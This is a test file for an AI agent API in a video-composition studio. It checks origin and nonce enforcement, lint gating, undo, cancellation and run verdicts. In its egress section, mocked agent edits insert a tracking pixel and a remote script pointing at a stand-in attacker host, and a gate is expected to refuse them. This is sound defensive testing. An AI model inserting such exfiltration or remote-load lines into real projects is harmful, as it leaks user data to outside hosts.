// @vitest-environment node

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

/**
 * TAB-805. Lets one test make the staging cleanup fail the way a live run did,
 * so the assertion is "the run still reports itself", not "rmSync works".
 */
const stagingRemoval = vi.hoisted(() => ({ shouldFail: false }));
vi.mock("node:fs", async (importActual) => {
  const actual = await importActual<typeof import("node:fs")>();
  return {
    ...actual,
    default: actual,
    rmSync: ((path: never, options: never) => {
      if (stagingRemoval.shouldFail && String(path).includes("staging"))
        throw new Error("ENOTEMPTY: directory not empty");
      return actual.rmSync(path, options);
    }) as typeof actual.rmSync,
  };
});

import { createHash } from "node:crypto";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { createStudioApi } from "../createStudioApi.js";
import type { StudioApiAdapter } from "../types.js";

const INITIAL_HTML = '<html data-composition-id="fixture"><body>before</body></html>\n';
/** A project that already fails lint, as every real one does (TAB-780). */
const INHERITED_HTML =
  '<html data-composition-id="fixture"><body>INHERITED_ERROR before</body></html>\n';

function completion(content: string, toolCalls: unknown[] = []): Response {
  return new Response(
    JSON.stringify({ choices: [{ message: { content, tool_calls: toolCalls } }] }),
    {
      status: 200,
      headers: { "Content-Type": "application/json" },
    },
  );
}

function toolCall(id: string, name: string, args: Record<string, unknown>) {
  return { id, type: "function", function: { name, arguments: JSON.stringify(args) } };
}

/** A run that looked before it spoke; the gate since TAB-1063 sends back one that did not. */
function readIndexFirst(): Response {
  return completion("", [toolCall("r0", "read_file", { path: "index.html" })]);
}

function fixture() {
  const root = mkdtempSync(join(tmpdir(), "tabario-agent-api-"));
  const projectDir = join(root, "project");
  mkdirSync(join(projectDir, "compositions"), { recursive: true });
  writeFileSync(join(projectDir, "index.html"), INITIAL_HTML);
  return { root, projectDir };
}

/**
 * Seed the shared fixture project with HTML of our choosing.
 *
 * TAB-780's cases need a project that *already* fails lint before the run, which
 * is the situation in production — sub-compositions are linted without the
 * parent that supplies their runtime, so every real project starts non-clean.
 */
function seedProject(setupDir: string, html: string): string {
  writeFileSync(join(setupDir, "index.html"), html);
  return createHash("sha256").update(html).digest("hex");
}

function adapter(projectDir: string): StudioApiAdapter {
  return {
    listProjects: () => [{ id: "demo", dir: projectDir }],
    resolveProject: (id) => (id === "demo" ? { id, dir: projectDir } : null),
    bundle: () => null,
    lint: (html) => ({
      // INHERITED_ERROR stands in for a lint error the project already had —
      // in production that is every `compositions/scene-N.html`, which reports
      // "uses GSAP but no GSAP script is loaded" because sub-compositions are
      // linted without the parent that supplies their runtime.
      findings: [
        ...(html.includes("LINT_ERROR")
          ? [{ severity: "error", message: "fixture lint error" }]
          : []),
        ...(html.includes("INHERITED_ERROR")
          ? [{ severity: "error", message: "pre-existing fixture error" }]
          : []),
      ],
    }),
    runtimeUrl: "/runtime.js",
    rendersDir: () => join(projectDir, "renders"),
    startRender: () => {
      throw new Error("unused");
    },
    installRegistryBlock: async ({ project, blockName }) => {
      const path = `compositions/${blockName}.html`;
      mkdirSync(join(project.dir, "compositions"), { recursive: true });
      writeFileSync(join(project.dir, path), `<html>${blockName}</html>\n`);
      return {
        written: [path],
        block: {
          name: blockName,
          title: blockName,
          description: "fixture",
          type: "hyperframes:block",
          files: [],
        },
      };
    },
  };
}

function headers(nonce?: string): Record<string, string> {
  return {
    Host: "localhost",
    Origin: "http://localhost",
    ...(nonce ? { "Content-Type": "application/json", "X-Hyperframes-Agent-Nonce": nonce } : {}),
  };
}

async function nonce(app: ReturnType<typeof createStudioApi>): Promise<string> {
  const response = await app.request("http://localhost/projects/demo/agent/capabilities", {
    headers: headers(),
  });
  const body = (await response.json()) as {
    enabled: boolean;
    nonce: string;
    providers: { tabario: { available: boolean } };
  };
  expect(body).toMatchObject({ enabled: true, providers: { tabario: { available: true } } });
  return body.nonce;
}

async function start(
  app: ReturnType<typeof createStudioApi>,
  token: string,
  prompt: string,
  extra: Record<string, unknown> = {},
): Promise<string> {
  const response = await app.request("http://localhost/projects/demo/agent/runs", {
    method: "POST",
    headers: headers(token),
    body: JSON.stringify({ provider: "tabario", kind: "chat", prompt, ...extra }),
  });
  expect(response.status, await response.clone().text()).toBe(202);
  return ((await response.json()) as { jobId: string }).jobId;
}

async function events(app: ReturnType<typeof createStudioApi>, jobId: string): Promise<string> {
  const response = await app.request(`http://localhost/agent/runs/${jobId}/events`, {
    headers: headers(),
  });
  expect(response.status).toBe(200);
  return response.text();
}

describe("Tabario AI API", () => {
  const oldKey = process.env.OPENROUTER_API_KEY;
  const oldState = process.env.HYPERFRAMES_STATE_DIR;
  let setup: ReturnType<typeof fixture>;

  beforeEach(() => {
    setup = fixture();
    process.env.OPENROUTER_API_KEY = "fixture-key";
    process.env.HYPERFRAMES_STATE_DIR = join(setup.root, "state");
  });

  afterEach(() => {
    if (oldKey === undefined) delete process.env.OPENROUTER_API_KEY;
    else process.env.OPENROUTER_API_KEY = oldKey;
    if (oldState === undefined) delete process.env.HYPERFRAMES_STATE_DIR;
    else process.env.HYPERFRAMES_STATE_DIR = oldState;
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it("enforces loopback, same-origin JSON mutations, nonce, provider, and prompt limits", async () => {
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const noNonce = await app.request("http://localhost/projects/demo/agent/runs", {
      method: "POST",
      headers: { ...headers(), "Content-Type": "application/json" },
      body: JSON.stringify({ provider: "tabario", kind: "chat", prompt: "hi" }),
    });
    expect(noNonce.status).toBe(403);
    const crossOrigin = await app.request("http://localhost/projects/demo/agent/threads/reset", {
      method: "POST",
      headers: {
        ...headers(token),
        Origin: "https://evil.example",
        "Sec-Fetch-Site": "cross-site",
      },
      body: JSON.stringify({ provider: "tabario" }),
    });
    expect(crossOrigin.status).toBe(403);
    const oversized = await app.request("http://localhost/projects/demo/agent/runs", {
      method: "POST",
      headers: headers(token),
      body: JSON.stringify({
        provider: "tabario",
        kind: "chat",
        prompt: "x".repeat(128 * 1024 + 1),
      }),
    });
    expect(oversized.status).toBe(413);
    const wrongProvider = await app.request("http://localhost/projects/demo/agent/runs", {
      method: "POST",
      headers: headers(token),
      body: JSON.stringify({ provider: "codex", kind: "chat", prompt: "hi" }),
    });
    expect(wrongProvider.status).toBe(400);
  });

  it("lints in staging, applies one transaction, persists chat, refreshes, and undoes", async () => {
    const hash = createHash("sha256").update(INITIAL_HTML).digest("hex");
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(
          completion("", [
            toolCall("write", "edit_file", {
              path: "index.html",
              old_string: "before",
              new_string: "after",
              expected_hash: hash,
            }),
          ]),
        )
        .mockImplementation(async () => completion("Updated the timeline.")),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const jobId = await start(app, token, "Change the opening", { kind: "timeline" });
    const stream = await events(app, jobId);

    expect(stream).toContain("event: changed-files");
    expect(stream).toContain("event: lint");
    expect(stream).toContain("event: complete");
    expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toContain("after");

    const threadResponse = await app.request("http://localhost/projects/demo/agent/threads", {
      headers: headers(),
    });
    const threadBody = (await threadResponse.json()) as {
      threads: Array<{ provider: string; transcript: unknown[] }>;
    };
    expect(threadBody.threads[0]).toMatchObject({ provider: "tabario" });
    expect(threadBody.threads[0].transcript).toHaveLength(2);

    const undo = await app.request(`http://localhost/agent/runs/${jobId}/undo`, {
      method: "POST",
      headers: headers(token),
      body: "{}",
    });
    expect(undo.status).toBe(200);
    expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toBe(INITIAL_HTML);
  });

  it("blocks lint errors without exposing partial live changes", async () => {
    const hash = createHash("sha256").update(INITIAL_HTML).digest("hex");
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(
          completion("", [
            toolCall("write", "edit_file", {
              path: "index.html",
              old_string: "before",
              new_string: "LINT_ERROR",
              expected_hash: hash,
            }),
          ]),
        )
        .mockImplementation(async () => completion("Made the requested change.")),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const jobId = await start(app, token, "Break it", { kind: "timeline" });
    const stream = await events(app, jobId);

    expect(stream).toContain("event: failure");
    expect(stream).toContain("introduced lint errors and were not applied");
    // The message names what it introduced, so the user is not left to guess
    // which of the project's errors stopped their edit.
    expect(stream).toContain("fixture lint error");
    expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toBe(INITIAL_HTML);
  });

  /**
   * TAB-780. The gate compared the staged tree against nothing, so any error the
   * project already carried held it permanently shut. In production that was six
   * of them on an untouched project — Tabario AI could not apply anything, ever.
   */
  it("applies an edit to a project that already fails lint", async () => {
    const hash = seedProject(setup.projectDir, INHERITED_HTML);
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(
          completion("", [
            toolCall("write", "edit_file", {
              path: "index.html",
              old_string: "before",
              new_string: "after",
              expected_hash: hash,
            }),
          ]),
        )
        .mockImplementation(async () => completion("Made the requested change.")),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const jobId = await start(app, token, "Change it", { kind: "timeline" });
    const stream = await events(app, jobId);

    expect(stream).not.toContain("event: failure");
    expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toContain("after");
  });

  it("still refuses an edit that adds a new error to an already-failing project", async () => {
    const hash = seedProject(setup.projectDir, INHERITED_HTML);
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(
          completion("", [
            toolCall("write", "edit_file", {
              path: "index.html",
              old_string: "before",
              new_string: "LINT_ERROR",
              expected_hash: hash,
            }),
          ]),
        )
        .mockImplementation(async () => completion("Made the requested change.")),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const jobId = await start(app, token, "Break it", { kind: "timeline" });
    const stream = await events(app, jobId);

    expect(stream).toContain("event: failure");
    // Read the failure message itself rather than the whole stream: the `lint`
    // event legitimately reports every finding it saw, including inherited ones.
    // What matters is that the *refusal* names only what this run introduced,
    // so the user is not sent chasing an error that was already there.
    const failure = stream
      .split("\n")
      .filter((line) => line.startsWith("data:") && line.includes('"type":"failure"'))
      .join("");
    expect(failure).toContain("fixture lint error");
    expect(failure).not.toContain("pre-existing fixture error");
    expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toContain("before");
  });

  it("does not report a staged-changes failure for a question that stages nothing", async () => {
    seedProject(setup.projectDir, INHERITED_HTML);
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(readIndexFirst())
        .mockResolvedValueOnce(completion("There is no video between 4s and 7s because …")),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const jobId = await start(app, token, "Why is there a gap?", { kind: "chat" });
    const stream = await events(app, jobId);

    expect(stream).not.toContain("were not applied");
    expect(stream).not.toContain("event: failure");
  });

  /**
   * TAB-794. `chat` is what every message typed into Studio's chat arrives as,
   * so it can no longer mean "read-only" — a reported problem has to end in an
   * applied edit. `isEditRequest` still calls this kind a non-edit, which is
   * only about the wording of the no-op message; the transaction itself must
   * commit exactly as any other kind does.
   */
  it("applies a chat-kind run that edited in response to a reported problem", async () => {
    const hash = seedProject(setup.projectDir, INITIAL_HTML);
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(
          completion("", [
            toolCall("write", "edit_file", {
              path: "index.html",
              old_string: "before",
              new_string: "after",
              expected_hash: hash,
            }),
          ]),
        )
        .mockImplementation(async () => completion("I moved the captions down.")),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const jobId = await start(app, token, 'The "Caption Layer" is too high', { kind: "chat" });
    const stream = await events(app, jobId);

    expect(stream).toContain("event: changed-files");
    expect(stream).not.toContain("event: failure");
    expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toContain("after");
  });

  it("cancels an in-flight model call without applying staged work", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn(
        (_url: string, init?: RequestInit) =>
          new Promise<Response>((_resolve, reject) => {
            init?.signal?.addEventListener(
              "abort",
              () => reject(new DOMException("cancelled", "AbortError")),
              { once: true },
            );
          }),
      ),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const jobId = await start(app, token, "Wait for me");
    const cancel = await app.request(`http://localhost/agent/runs/${jobId}/cancel`, {
      method: "POST",
      headers: headers(token),
      body: "{}",
    });
    expect(cancel.status).toBe(200);
    const stream = await events(app, jobId);
    expect(stream).toContain("event: cancelled");
    expect(stream).toContain("No staged changes were applied");
    expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toBe(INITIAL_HTML);
  });

  it("refuses Undo while another transaction owns the project lock", async () => {
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(readIndexFirst())
        .mockResolvedValueOnce(completion("No changes needed."))
        .mockImplementationOnce(
          (_url: string, init?: RequestInit) =>
            new Promise<Response>((_resolve, reject) => {
              init?.signal?.addEventListener(
                "abort",
                () => reject(new DOMException("cancelled", "AbortError")),
                { once: true },
              );
            }),
        ),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const completedJob = await start(app, token, "Inspect the timeline");
    expect(await events(app, completedJob)).toContain("event: complete");

    const activeJob = await start(app, token, "Keep inspecting");
    const undo = await app.request(`http://localhost/agent/runs/${completedJob}/undo`, {
      method: "POST",
      headers: headers(token),
      body: "{}",
    });
    expect(undo.status).toBe(409);
    expect(await undo.text()).toContain("already working on this project");

    await app.request(`http://localhost/agent/runs/${activeJob}/cancel`, {
      method: "POST",
      headers: headers(token),
      body: "{}",
    });
    expect(await events(app, activeJob)).toContain("event: cancelled");
  });

  /**
   * TAB-1063. A chat request may carry the element selected on the timeline.
   * A malformed selection is a bad request, not a silently dropped field.
   *
   * Amended on purpose by TAB-1194. This asserted the selection was in the
   * user's message, ahead of the user's words, and named itself "... and keeps
   * it out of the user's bubble". Both halves were the defect: the model read
   * it as the user speaking, and the user could not see it. It now reaches the
   * model framed, in the system message, and reaches the drawer on the stream
   * and on the thread.
   */
  it("carries the timeline selection to the model as data, and to the drawer in full", async () => {
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce(readIndexFirst())
      .mockImplementation(async () => completion("Caption 0 says: before."));
    vi.stubGlobal("fetch", fetchMock);
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const jobId = await start(app, token, "make this two lines", {
      selection: { id: "caption-0", label: "Caption 0", start: 0, duration: 3.2 },
    });
    const stream = await events(app, jobId);
    expect(stream).toContain("event: complete");

    const told =
      'Selected on the timeline: "Caption 0", the element with id "caption-0" in index.html, ' +
      "on screen from 0.0s to 3.2s.";
    const body = JSON.parse(String(fetchMock.mock.calls[0]?.[1]?.body));
    const roles = body.messages.map((message: { role: string }) => message.role);
    expect(roles).toEqual(["system", "user"]);
    expect(body.messages[1].content).toBe("make this two lines");
    expect(body.messages[0].content).toMatch(
      /<<TABARIO-DATA-[0-9a-f]{24} source="selection">>\nWith the user's latest message: Selected on the timeline: "Caption 0"/,
    );

    // What the model was told is what the drawer is given: once on the stream,
    // so it can be shown while the run is still going, and once on the thread.
    const context = stream
      .split("\n")
      .filter((line) => line.startsWith("data: "))
      .map((line) => JSON.parse(line.slice("data: ".length)) as { type: string; message?: string })
      .filter((event) => event.type === "context");
    expect(context.map((event) => event.message)).toEqual([told]);

    const threads = (await (
      await app.request("http://localhost/projects/demo/agent/threads", { headers: headers() })
    ).json()) as {
      threads: Array<{ transcript: Array<{ role: string; text: string; context?: string }> }>;
    };
    expect(threads.threads[0].transcript[0]).toMatchObject({
      role: "user",
      text: "make this two lines",
      context: told,
    });

    const rejected = await app.request("http://localhost/projects/demo/agent/runs", {
      method: "POST",
      headers: headers(token),
      body: JSON.stringify({
        provider: "tabario",
        kind: "chat",
        prompt: "x",
        selection: { id: "caption-0", label: "Caption 0", start: -1, duration: 3.2 },
      }),
    });
    expect(rejected.status).toBe(400);
  });

  it("stages registry installation inside the same undoable transaction", async () => {
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(readIndexFirst())
        .mockImplementation(async () => completion("Added the registry component.")),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    const jobId = await start(app, token, "Add the accent", {
      kind: "catalog",
      registryItem: "accent",
    });
    const stream = await events(app, jobId);
    expect(stream).toContain("event: complete");
    expect(existsSync(join(setup.projectDir, "compositions/accent.html"))).toBe(true);
    await app.request(`http://localhost/agent/runs/${jobId}/undo`, {
      method: "POST",
      headers: headers(token),
      body: "{}",
    });
    expect(existsSync(join(setup.projectDir, "compositions/accent.html"))).toBe(false);
  });

  /**
   * A run that measured, applied its changes, and then vanished: no reply, no
   * completion, ledger stuck on "running". The cleanup in the run's `finally`
   * threw — a TAB-805 measurement server had inherited the project's autoProxy
   * and was writing transcodes into the staging directory as it was removed —
   * and a throw there skips `recordAssistant` and `finishRun` both.
   *
   * Cleanup must never decide whether the run gets to report itself.
   */
  it("still reports the run when the staging cleanup fails", async () => {
    const hash = createHash("sha256").update(INITIAL_HTML).digest("hex");
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(
          completion("", [
            toolCall("write", "edit_file", {
              path: "index.html",
              old_string: "before",
              new_string: "after",
              expected_hash: hash,
            }),
          ]),
        )
        .mockImplementation(async () => completion("Updated the timeline.")),
    );
    const app = createStudioApi(adapter(setup.projectDir));
    const token = await nonce(app);
    stagingRemoval.shouldFail = true;
    try {
      const jobId = await start(app, token, "Change the opening", { kind: "timeline" });
      const stream = await events(app, jobId);
      expect(stream).toContain("event: changed-files");
      expect(stream).toContain("event: assistant");
      expect(stream).toContain("event: complete");
    } finally {
      stagingRemoval.shouldFail = false;
    }
    expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toContain("after");
  });

  /**
   * TAB-1196. Every finished run carries one verdict, on the event that closes
   * it and on its ledger, decided from what the run did and never from what the
   * reply says it did.
   */
  describe("verdicts (TAB-1196)", () => {
    type StreamEvent = {
      type: string;
      message?: string;
      verdict?: string;
      verdictReason?: string;
      refusal?: { gate: string; stage: string; message: string; file?: string };
    };

    function parseStream(stream: string): StreamEvent[] {
      return stream
        .split("\n")
        .filter((line) => line.startsWith("data: "))
        .map((line) => JSON.parse(line.slice("data: ".length)) as StreamEvent);
    }

    function terminal(stream: string): StreamEvent {
      const last = parseStream(stream).at(-1);
      if (!last) throw new Error("the stream carried no events");
      return last;
    }

    function ledger(projectDir: string, jobId: string) {
      const key = createHash("sha256").update(resolve(projectDir)).digest("hex").slice(0, 24);
      const path = join(setup.root, "state", "studio-agent", key, "runs", `${jobId}.json`);
      return JSON.parse(readFileSync(path, "utf-8")) as {
        status: string;
        verdict?: string;
        verdictReason?: string;
        refusals?: Array<{ gate: string; stage: string }>;
      };
    }

    function editThenReply(newString: string, reply: string) {
      const hash = createHash("sha256").update(INITIAL_HTML).digest("hex");
      return vi
        .fn()
        .mockResolvedValueOnce(
          completion("", [
            toolCall("write", "edit_file", {
              path: "index.html",
              old_string: "before",
              new_string: newString,
              expected_hash: hash,
            }),
          ]),
        )
        .mockImplementation(async () => completion(reply));
    }

    async function runOnce(
      app: ReturnType<typeof createStudioApi>,
      prompt: string,
      kind = "chat",
    ): Promise<{ jobId: string; stream: string }> {
      const token = await nonce(app);
      const jobId = await start(app, token, prompt, { kind });
      return { jobId, stream: await events(app, jobId) };
    }

    it("reports a run that wrote and never measured as saved, not verified", async () => {
      vi.stubGlobal("fetch", editThenReply("after", "It now fits on two lines."));
      const app = createStudioApi(adapter(setup.projectDir));
      const { jobId, stream } = await runOnce(app, "Change the opening", "timeline");

      const end = terminal(stream);
      expect(end.type).toBe("complete");
      expect(end.verdict).toBe("saved");
      expect(end.verdictReason).toContain("nothing measured them afterwards");
      expect(ledger(setup.projectDir, jobId)).toMatchObject({
        status: "complete",
        verdict: "saved",
      });
    });

    it("reports a run measured after its last change as verified", async () => {
      const hash = createHash("sha256").update(INITIAL_HTML).digest("hex");
      vi.stubGlobal(
        "fetch",
        vi
          .fn()
          .mockResolvedValueOnce(
            completion("", [
              toolCall("write", "edit_file", {
                path: "index.html",
                old_string: "before",
                new_string: "after",
                expected_hash: hash,
              }),
            ]),
          )
          .mockResolvedValueOnce(
            completion("", [toolCall("m", "measure_layout", { selectors: ["body"] })]),
          )
          .mockImplementation(async () => completion("It is on one line.")),
      );
      const measureLayout = vi.fn().mockResolvedValue({
        measured: true,
        seekTime: 0,
        elements: [{ selector: "body", lines: 1 }],
      });
      const app = createStudioApi({ ...adapter(setup.projectDir), measureLayout });
      const { jobId, stream } = await runOnce(app, "Change the opening", "timeline");

      expect(terminal(stream).verdict).toBe("verified");
      expect(ledger(setup.projectDir, jobId).verdict).toBe("verified");
    });

    it("reports a question that changed nothing as dispatched", async () => {
      vi.stubGlobal(
        "fetch",
        vi
          .fn()
          .mockResolvedValueOnce(readIndexFirst())
          .mockResolvedValueOnce(completion("The title is on screen for two seconds.")),
      );
      const app = createStudioApi(adapter(setup.projectDir));
      const { jobId, stream } = await runOnce(app, "How long is the title up?");

      const end = terminal(stream);
      expect(end.type).toBe("complete");
      expect(end.verdict).toBe("dispatched");
      expect(ledger(setup.projectDir, jobId).verdict).toBe("dispatched");
    });

    it("reports a change the lint gate declined as refused, and records the refusal", async () => {
      vi.stubGlobal("fetch", editThenReply("LINT_ERROR", "I have updated the opening."));
      const app = createStudioApi(adapter(setup.projectDir));
      const { jobId, stream } = await runOnce(app, "Break it", "timeline");

      const all = parseStream(stream);
      const refusal = all.find((event) => event.type === "refusal");
      expect(refusal?.refusal).toMatchObject({ gate: "lint", stage: "apply" });
      // Said before the run closes, so a consumer reading in order has the
      // refusal in hand when the verdict arrives.
      expect(all.indexOf(refusal as StreamEvent)).toBeLessThan(all.length - 1);

      const end = terminal(stream);
      expect(end.type).toBe("failure");
      expect(end.verdict).toBe("refused");
      const kept = ledger(setup.projectDir, jobId);
      expect(kept).toMatchObject({ status: "failed", verdict: "refused" });
      expect(kept.refusals).toEqual([expect.objectContaining({ gate: "lint", stage: "apply" })]);
      expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toBe(INITIAL_HTML);
    });

    it("reports a run the provider ended as failed, with no refusal on it", async () => {
      vi.stubGlobal(
        "fetch",
        vi.fn().mockImplementation(async () => new Response("no", { status: 401 })),
      );
      const app = createStudioApi(adapter(setup.projectDir));
      const { jobId, stream } = await runOnce(app, "Change the opening", "timeline");

      const end = terminal(stream);
      expect(end.type).toBe("failure");
      expect(end.verdict).toBe("failed");
      expect(stream).not.toContain("event: refusal");
      expect(ledger(setup.projectDir, jobId).refusals).toBeUndefined();
    });

    it("reports a cancelled run as failed", async () => {
      vi.stubGlobal(
        "fetch",
        vi.fn().mockImplementation(
          (_url: string, init: RequestInit) =>
            new Promise((_resolve, reject) => {
              init.signal?.addEventListener("abort", () =>
                reject(new DOMException("aborted", "AbortError")),
              );
            }),
        ),
      );
      const app = createStudioApi(adapter(setup.projectDir));
      const token = await nonce(app);
      const jobId = await start(app, token, "Take your time", { kind: "timeline" });
      const cancel = await app.request(`http://localhost/agent/runs/${jobId}/cancel`, {
        method: "POST",
        headers: headers(token),
        body: "{}",
      });
      expect(cancel.status).toBe(200);

      const end = terminal(await events(app, jobId));
      expect(end.type).toBe("cancelled");
      expect(end.verdict).toBe("failed");
      expect(end.verdictReason).toContain("cancelled");
    });

    it("carries exactly one verdict per run, on the event that closes it", async () => {
      vi.stubGlobal("fetch", editThenReply("after", "Updated."));
      const app = createStudioApi(adapter(setup.projectDir));
      const { stream } = await runOnce(app, "Change the opening", "timeline");

      const carrying = parseStream(stream).filter((event) => event.verdict !== undefined);
      expect(carrying).toHaveLength(1);
      expect(carrying[0]?.type).toBe("complete");
    });

    it("forgets the oldest finished runs and keeps the newest twenty", async () => {
      vi.stubGlobal(
        "fetch",
        vi.fn().mockImplementation(async (_url: string, init: RequestInit) => {
          const body = JSON.parse(String(init.body)) as { messages: Array<{ role: string }> };
          // First round of a run reads the project; the second answers.
          return body.messages.some((message) => message.role === "tool")
            ? completion("Two seconds.")
            : readIndexFirst();
        }),
      );
      const app = createStudioApi(adapter(setup.projectDir));
      const jobIds: string[] = [];
      for (let index = 0; index < 23; index += 1) {
        const { jobId, stream } = await runOnce(app, `Question ${index}`);
        expect(terminal(stream).type).toBe("complete");
        jobIds.push(jobId);
      }

      const status = async (jobId: string) =>
        (await app.request(`http://localhost/agent/runs/${jobId}/events`, { headers: headers() }))
          .status;
      for (const forgotten of jobIds.slice(0, 3)) expect(await status(forgotten)).toBe(404);
      for (const kept of jobIds.slice(3)) expect(await status(kept)).toBe(200);
    });

    describe("egress the agent introduces (TAB-1195)", () => {
      const PIXEL = '<img src="https://evil.example/p.png?d=1">';
      const hashOf = (content: string) => createHash("sha256").update(content).digest("hex");

      function editIndex(id: string, current: string, oldString: string, newString: string) {
        return toolCall(id, "edit_file", {
          path: "index.html",
          old_string: oldString,
          new_string: newString,
          expected_hash: hashOf(current),
        });
      }

      /** The one staging tree a run in this fixture is working in. */
      function stagingDir(): string {
        const key = hashOf(resolve(setup.projectDir)).slice(0, 24);
        const root = join(setup.root, "state", "studio-agent", key, "staging");
        const [only, ...others] = readdirSync(root);
        if (!only || others.length > 0) throw new Error("expected exactly one staging tree");
        return join(root, only);
      }

      it("records a refusal the model repaired mid-run, and still applies the repair", async () => {
        vi.stubGlobal(
          "fetch",
          vi
            .fn()
            .mockResolvedValueOnce(
              completion("", [editIndex("leak", INITIAL_HTML, "before", `before${PIXEL}`)]),
            )
            .mockResolvedValueOnce(
              completion("", [editIndex("fix", INITIAL_HTML, "before", "after")]),
            )
            .mockImplementation(async () => completion("Updated the opening.")),
        );
        const app = createStudioApi(adapter(setup.projectDir));
        const { jobId, stream } = await runOnce(app, "Change the opening", "timeline");

        const refusals = parseStream(stream).filter((event) => event.type === "refusal");
        expect(refusals).toHaveLength(1);
        expect(refusals[0]?.refusal).toMatchObject({
          gate: "egress",
          stage: "tool",
          file: "index.html",
        });
        expect(refusals[0]?.refusal?.message).toContain("https://evil.example/p.png?d=1");

        // A refusal the model answered by doing something else is on the record
        // and does not decide how the run ended.
        expect(terminal(stream)).toMatchObject({ type: "complete", verdict: "saved" });
        expect(ledger(setup.projectDir, jobId).refusals).toEqual([
          expect.objectContaining({ gate: "egress", stage: "tool" }),
        ]);
        expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toBe(
          INITIAL_HTML.replace("before", "after"),
        );
      });

      /**
       * The apply gate, reached the only way it can be: by a write that did not
       * go through `edit_file` or `write_file`. Nothing in the agent does that
       * today, which is the reason to assert it. The gate is there for the day
       * something does.
       */
      it("refuses at apply a remote URL that reached the staging tree past the tools", async () => {
        const leaking = INITIAL_HTML.replace(
          "before",
          'before<script src="https://evil.example/x.js"></script>',
        );
        vi.stubGlobal(
          "fetch",
          vi
            .fn()
            .mockResolvedValueOnce(readIndexFirst())
            .mockImplementation(async () => {
              writeFileSync(join(stagingDir(), "index.html"), leaking);
              return completion("I have updated the opening.");
            }),
        );
        const app = createStudioApi(adapter(setup.projectDir));
        const { jobId, stream } = await runOnce(app, "Change the opening", "timeline");

        const all = parseStream(stream);
        const refusal = all.find((event) => event.type === "refusal");
        expect(refusal?.refusal).toMatchObject({
          gate: "egress",
          stage: "apply",
          file: "index.html",
        });
        expect(refusal?.message).toContain("index.html");
        expect(refusal?.message).toContain("https://evil.example/x.js");

        const end = terminal(stream);
        expect(end.type).toBe("failure");
        expect(end.verdict).toBe("refused");
        expect(end.verdictReason).toContain("load from or send to another host");
        // The verdict is structural. The URL stays in the refusal.
        expect(end.verdictReason).not.toContain("evil.example");
        expect(ledger(setup.projectDir, jobId)).toMatchObject({
          status: "failed",
          verdict: "refused",
          refusals: [expect.objectContaining({ gate: "egress", stage: "apply" })],
        });
        expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toBe(INITIAL_HTML);
      });

      it("applies an edit to a project that already loads from another host", async () => {
        const inherited = INITIAL_HTML.replace("before", `before${PIXEL}`);
        seedProject(setup.projectDir, inherited);
        vi.stubGlobal(
          "fetch",
          vi
            .fn()
            .mockResolvedValueOnce(
              completion("", [editIndex("write", inherited, "before", "after")]),
            )
            .mockImplementation(async () => completion("Updated.")),
        );
        const app = createStudioApi(adapter(setup.projectDir));
        const { stream } = await runOnce(app, "Change the opening", "timeline");

        expect(stream).not.toContain("event: refusal");
        expect(terminal(stream)).toMatchObject({ type: "complete", verdict: "saved" });
        expect(readFileSync(join(setup.projectDir, "index.html"), "utf-8")).toBe(
          inherited.replace("before", "after"),
        );
      });

      it("does not hold a registry block the user asked for against the agent", async () => {
        const block = '<html><script src="https://cdn.example.com/gsap.js"></script></html>\n';
        vi.stubGlobal(
          "fetch",
          vi
            .fn()
            .mockResolvedValueOnce(
              completion("", [editIndex("write", INITIAL_HTML, "before", "after")]),
            )
            .mockImplementation(async () => completion("Installed and wired.")),
        );
        const app = createStudioApi({
          ...adapter(setup.projectDir),
          installRegistryBlock: async ({ project, blockName }) => {
            const path = `compositions/${blockName}.html`;
            mkdirSync(join(project.dir, "compositions"), { recursive: true });
            writeFileSync(join(project.dir, path), block);
            return {
              written: [path],
              block: {
                name: blockName,
                title: blockName,
                description: "fixture",
                type: "hyperframes:block",
                files: [],
              },
            };
          },
        });
        const token = await nonce(app);
        const jobId = await start(app, token, "Add the accent block", {
          kind: "catalog",
          registryItem: "accent",
        });
        const stream = await events(app, jobId);

